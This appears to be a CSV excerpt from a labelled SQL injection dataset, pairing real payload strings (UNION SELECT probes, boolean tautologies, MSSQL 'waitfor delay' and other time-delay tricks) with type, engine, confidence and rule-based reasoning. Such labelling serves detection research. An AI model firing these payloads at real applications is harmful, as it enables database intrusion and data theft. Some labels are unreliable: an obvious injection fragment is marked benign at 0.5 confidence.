id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19744,1 ) as fhvb where 4008 = 4008,benign,generic,0.5,UNCERTAIN: payload '1 ) as fhvb where 4008 = 4008' has no recognized SQLi function/keyword pattern,2
19745,"-4798%' ) ) ) union all select 3330,3330,3330#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19746,"1%' ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.95,Payload contains 'union all select' -> union_based (priority P7). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19747,"-6496"" ) ) ) or 1471 = 5278 and ( ( ( ""zkoj"" = ""zkoj",boolean_blind,generic,0.95,Payload contains 'or 1471 = 5278' -> boolean_blind (priority P3). DB engine 'generic'. Selected lowest-priority among 1 signal(s).,3
19748,"waitfor delay '0:0:5' and ( ""%"" = """,time_blind,mssql,0.95,Payload contains 'waitfor delay' -> time_blind (priority P5). DB engine 'mssql'; DB hint token 'waitfor delay'. Selected lowest-priority among 1 signal(s).,3
19749,"1%"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,boolean_blind,generic,0.55,"No strong signal, but quote+equality tautology pattern in '1%"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 1' suggests boolean fragment",3
19750,"1"" and make_set ( 8403 = 8403,8899 ) and ""fqxr"" like ""fqxr",boolean_blind,mysql,0.85,Payload contains 'make_set(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'make_set'. Selected lowest-priority among 1 signal(s).,2
19751,"waitfor delay '0:0:5' and ( ( ( ""lpeo"" = ""lpeo",time_blind,mssql,0.95,Payload contains 'waitfor delay' -> time_blind (priority P5). DB engine 'mssql'; DB hint token 'waitfor delay'. Selected lowest-priority among 1 signal(s).,3
19752,"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'drui' like 'drui",time_blind,postgresql,0.7,Payload contains 'regexp_substring(repeat(...crypt_key...))' -> time_blind (priority P5). DB engine 'postgresql'; DB hint token 'regexp_substring'. Selected lowest-priority among 1 signal(s).,1
19753,1' ) ) ) rlike ( select ( case when ( 5524 = 9582 ) then 1 else 0x28 end ) ) and ( ( ( 'okoj' like 'okoj,boolean_blind,mysql,0.95,Payload contains 'rlike(' -> boolean_blind (priority P3). DB engine 'mysql'; DB hint token 'rlike'. Selected lowest-priority among 1 signal(s).,3
